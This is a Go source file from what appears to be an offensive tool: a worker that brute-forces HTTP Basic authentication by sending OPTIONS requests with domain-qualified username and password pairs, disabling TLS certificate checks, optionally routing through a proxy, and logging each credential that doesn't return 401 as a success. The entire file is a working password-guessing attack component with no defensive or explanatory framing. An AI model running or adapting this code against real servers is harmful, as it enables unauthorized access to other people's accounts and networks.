package lib

import (
	"crypto/tls"
	"net/http"
	"net/url"
	"time"
)

func BasicBruteWorker(info *TaskInfo) {

	for data := range info.task {
		username, password := data[0], data[1]
		if info.done.Get(username) {
			continue
		}
		Log.Debug("[*] 尝试: %v:%v", username, password)

		var client = &http.Client{
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
					Renegotiation:      tls.RenegotiateOnceAsClient,
					MinVersion:         tls.VersionTLS10,
				},
				Proxy: func(_ *http.Request) (*url.URL, error) {
					if info.proxy != "" {
						return url.Parse(info.proxy)
					} else {
						return nil, nil
					}
				},
			},
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}

		req, _ := http.NewRequest("OPTIONS", info.u, nil)
		req.SetBasicAuth(info.domain+"\\"+username, password)
		req.Header.Add("Connection", "close")
		res, err := client.Do(req)
		if err != nil {
			panic(err)
		}
		if res.StatusCode != 401 && res.StatusCode != 408 && res.StatusCode != 504 {
			Log.Success("[+] 成功: %v", username+":"+password)
			info.done.Set(username, password, info.o)
		} else {
			Log.Failed("[-] 失败: %v", username+":"+password)
		}
		time.Sleep(time.Second * time.Duration(info.delay))
	}
}
